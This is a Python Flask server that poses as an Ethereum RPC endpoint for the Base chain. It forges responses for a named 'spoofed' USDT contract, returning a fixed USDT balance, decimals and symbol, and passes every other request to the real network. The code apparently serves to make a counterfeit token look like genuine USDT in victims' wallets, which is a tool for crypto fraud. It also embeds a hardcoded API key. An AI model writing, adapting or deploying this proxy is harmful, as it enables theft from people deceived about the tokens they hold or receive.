from flask import Flask, request, jsonify
import requests
import os
from web3 import Web3

app = Flask(__name__)

REAL_USDT = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"
SPOOFED_USDT = "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2"
BASESCAN_API_KEY = os.environ.get("BASESCAN_API_KEY", "7BHHVMRP3GIXMMIIJSUNA5JRKSSG8FCVA9")
BASE_RPC = "https://mainnet.base.org"
w3 = Web3(Web3.HTTPProvider(BASE_RPC))

# ERC20 ABI for basic functions we need to handle
ERC20_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "", "type": "uint8"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "symbol",
        "outputs": [{"name": "", "type": "string"}],
        "type": "function"
    }
]

@app.route('/rpc', methods=['POST'])
def handle_rpc():
    data = request.get_json()
    method = data.get("method")

    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": "0x2105"})
    
    if method == "wallet_switchEthereumChain":
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": "0x2105"})
    
    if method == "wallet_addEthereumChain":
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": True})
    
    if method == "eth_call" and data.get("params") and len(data["params"]) > 0:
        call_obj = data["params"][0]
        
        # Check if the call is to our spoofed USDT contract
        if call_obj.get("to") and call_obj["to"].lower() == SPOOFED_USDT.lower():
            # Get the function signature from the data field
            if call_obj.get("data"):
                function_signature = call_obj["data"][:10]  # First 10 chars (with 0x) is function signature
                
                # Handle balanceOf function (0x70a08231)
                if function_signature.startswith("0x70a08231"):
                    # Extract the address from the data field
                    # The address starts at position 10 (after function signature) and is 64 characters long
                    address_hex = call_obj["data"][10:74]
                    # Add padding to get a proper address
                    address = "0x" + address_hex[-40:]
                    
                    # Return a fixed balance of 1 USDT (1 * 10^6 since USDT has 6 decimals)
                    spoofed_balance = int(1 * 10**6)
                    result = "0x" + hex(spoofed_balance)[2:].zfill(64)
                    return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": result})
                
                # Handle decimals function (0x313ce567)
                elif function_signature.startswith("0x313ce567"):
                    # USDT has 6 decimals
                    decimals = 6
                    result = "0x" + hex(decimals)[2:].zfill(64)
                    return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": result})
                
                # Handle symbol function (0x95d89b41)
                elif function_signature.startswith("0x95d89b41"):
                    # Return "USDT" as hex-encoded string
                    symbol_hex = "0x" + "USDT".encode("utf-8").hex().ljust(64, "0")
                    return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": symbol_hex})

    # Forward all other requests to the real BASE RPC
    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
    return jsonify(response.json())

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
